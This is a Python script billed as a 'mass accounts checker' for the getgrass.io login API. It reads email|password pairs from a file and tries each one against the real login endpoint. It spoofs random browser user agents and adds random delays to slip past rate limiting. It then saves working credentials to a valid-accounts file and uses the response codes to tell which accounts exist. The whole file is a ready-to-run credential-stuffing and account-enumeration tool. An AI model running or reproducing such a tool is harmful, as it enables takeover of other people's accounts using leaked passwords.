import requests
import time
import random
from fake_useragent import UserAgent
from colorama import init, Fore

init(autoreset=True)

url = 'https://api.getgrass.io/login'
headers = {
    'origin': 'https://app.getgrass.io',
    'referer': 'https://app.getgrass.io/',
    'user-agent': UserAgent().random
}

banner = """
     _____)           _____)                           
   /                /                             ,    
  /   ___    _ _/_ /   ___   __  _   _   _          ___
 /     / ) _(/_(__/     / ) / (_(_(_/_)_/_)_ o  _(_(_) 
(____ /          (____ /                               
                                                       
"""
print(Fore.CYAN + banner + Fore.RESET)
print(f"{Fore.CYAN}     MASS ACCOUNTS CHECKER | github.com/im-hanzou{Fore.RESET}")
print(f"\n")
filename = input(f"{Fore.BLUE}Input your (USER|PASS) file : {Fore.RESET}")
print(f"\n")

valid_file = 'valid.txt'
invalid_pass_file = 'invalidpass.txt'
invalid_accs_file = 'invalidaccs.txt'

try:
    with open(filename, 'r') as file:
        for line in file:
            email, password = line.strip().split('|')
            data = {'username': email, 'password': password}
            response = requests.post(url, headers=headers, json=data)
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[ {email} | VALID ACCOUNT ]{Fore.RESET}")
                with open(valid_file, 'a') as valid_output:
                    valid_output.write(f"{email}|{password}\n")
            elif response.status_code == 400:
                print(f"{Fore.RED}[ {email} | INVALID PASSWORD ]{Fore.RESET}")
                with open(invalid_pass_file, 'a') as invalid_pass_output:
                    invalid_pass_output.write(f"{email}|{password}\n")
            elif response.status_code == 404:
                print(f"{Fore.RED}[ {email} | INVALID ACCOUNT ]{Fore.RESET}")
                with open(invalid_accs_file, 'a') as invalid_accs_output:
                    invalid_accs_output.write(f"{email}|{password}\n")
            else:
                print(f"{Fore.YELLOW}[  Unknown response: {response.status_code} | YOUR IP BANNED ]{Fore.RESET}")
            
            delay = random.uniform(1, 5) 
            time.sleep(delay)

except FileNotFoundError:
    print(f"{Fore.RED} File not found :) {Fore.RESET}")
